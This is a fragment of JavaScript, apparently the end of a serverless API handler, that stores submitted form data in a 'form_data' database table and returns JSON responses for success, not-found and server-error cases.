        const { error } = await db.from("form_data").insert({ app_id: body.app_id, sub_id: body.sub_id ?? null, form_type: body.form_type ?? "form", data: body.data ?? {}, submitted_at: new Date().toISOString() });
        const e = dbErrResp(error, cors); if (e) return e;
        return json({ ok: true }, 201, cors);
      }

      return json({ error: "Not found" }, 404, cors);

    } catch (err) {
      return json({ error: "Internal server error", detail: String(err) }, 500, cors);
    }
  },
};
